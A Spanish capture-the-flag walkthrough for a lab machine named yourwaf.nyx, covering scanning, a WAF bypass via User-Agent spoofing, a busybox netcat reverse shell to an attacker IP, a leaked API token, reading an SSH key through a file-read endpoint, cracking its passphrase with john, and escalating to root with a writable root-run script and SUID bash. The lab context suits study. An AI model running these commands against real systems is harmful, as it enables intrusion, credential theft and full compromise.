Writeup

<!--

netdiscover -> 192.168.1.44

first nmap -> 
22
80

second nmap -> 

dirb to directories

gobuster to subdomains (no funciona)

third nmap, nuevo puerto 3000 (node.js)
Dirb sobre el nuevo puerto ya que HTTP, y encontramos /logs, que nos indica que el WAF está actuando y detectando nmap y demás

Anteriormente, hemos visto que gobuster no ha funcionado y no ha conseguido darnos ningún tipo de información, podemos deducir que esto es debido al WAF, ya que si quitamos el subdominio www.yourwaf.nyx, gobuster es incapaz de reconocerlo aunqué esté ahí. Para poder probar un bypass sencillo del WAF, podemos probar a introducir una cabecera http con un User-agent correcto, esto hará que el WAF se crea que la petición viene de un navegador legítimo y no de herramientas como gobuster

gobuster vhost -u http://yourwaf.nyx --append-domain yourwaf.nyx -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

y voila, sacamos otro dominio que no habíamos visto antes

~~archivo salida buen gobuster

Añadimos el nuevo dominio al archivo hosts

miramos de nuevo la página
imagen

ejecutamos whoami para ver su funcionamiento
imagen

Nos enviamos una reverse shell, pero parece ser que no podemos hacer bash -i, ni curl, por lo que probamos con busybox y netcat y lo conseguimos

busybox nc 192.168.1.12 443 -e bash

imagen

Una vez dentro probamos a escalar a un usuario tester:

sudo -l (no existe sudo)
getcap -r / 2>/dev/null (nada)
crontab -l (nada)
find / -perm -4000 2>/dev/null (nada)
ls -la /tmp (nada interesante)
ls -la /opt -> encontramos un directorio llamado nodeapp en el que aunque no tenemos permisos de ejecución sobre los scripts, tenemos permisos de lectura, vamos a mirar a ver si hay algo dentro de ellos

Encontramos un apitoken, que nos puede servir para entrar por el puerto 3000 a la página principal

con una consulta get->/?api-token=8c2b6a304191b8e2d81aaa5d1131d83d

Conseguimos acceso

Revisando el archivo javascript, vemos que existen dos funcionalidades más, una que reinicia el servidor y otra que parece leer archivos, vamos a ver la segunda

Para eso necesitamos encadenar los comandos en la url, vamos a probar a leer el archivo /root/root.txt

imagen error read file

Vemos que empieza desde /opt/nodeapp/+ lo que tu busques

let path_to_file = __dirname + file
  res.sendFile(path.resolve(path_to_file))

vamos a ver si consguimos movernos sobre los directorios, nos creamos desde la reverse shell un archivo de prueba para ver si se llega desde readfile

imagen

Vemos que no, posiblemente solo pueda llegar dentro del espacio definido de /opt/nodeapp. Volvemos a probar ahora con una localizacion diferente como /var/www/maintenance.yourwaf.nyx/index.php y voilá, tenemos acceso de lectura sobre el directorio. Esto es debido a que cada usuario se monta su /tmp en su sesión, de esta forma nadie ajeno al usuario puede ver los archivos temporales que tiene dentro del directorio.

Vamos a intentar leer user.txt en /home/tester pero parece no ser correcto. Podríamos hacer fuzzing sobre el directorio y ver diferentes respuestas, pero antes de hacer esto vamos a ver si por causalidad existe alguna clave privada/pública en el directorio /home de tester:

imagen de id_rsaTester

La tenemos! Vamos a intentar entrar mediante ssh con tester, pero necesita passprhase y no es ""

imagen error ssh

Vamos a ver si se puede sacar de la clave

ssh2john id_rsa > id_rsaHash

ahora con john intentamos crackearla

ohn id_rsaHash --fork=2 --wordlist=/usr/share/wordlists/rockyou.txt --rules=single > passTester

imagen

Tenemos la passphrase! y entramos como tester

imagen

Antes de revisar los permisos, al principio cuando estabamos revisando /opt/nodeapp, vimos que había un archivo con permisos totales para el grupo de copylogs, y si vemos a qué grupos pertenece tester, vemos que pertenece a copylogs (y mil más) por lo que lo único que nos queda, es ver quién ejecuta el script, por lo que nos creamos un pequeño oneliner que revisa cada 0,05s si hay algún proceso que ejecute copylogs.sh.

Imagen copylogs

Al ser root el que ejecuta el script y nosotros poder modificarlo, podemos hacer que cada 10 segundos, root ejecute lo que queramos. Hay mil formas de hacer esto, en este caso añadiremos el permiso SUID a bash para poder acceder con privilegios a ella desde tester

chmod u+s /bin/bash

imagen bash-p

Y tenemos acceso como root y podemos obtener su flag

imagen root







-->
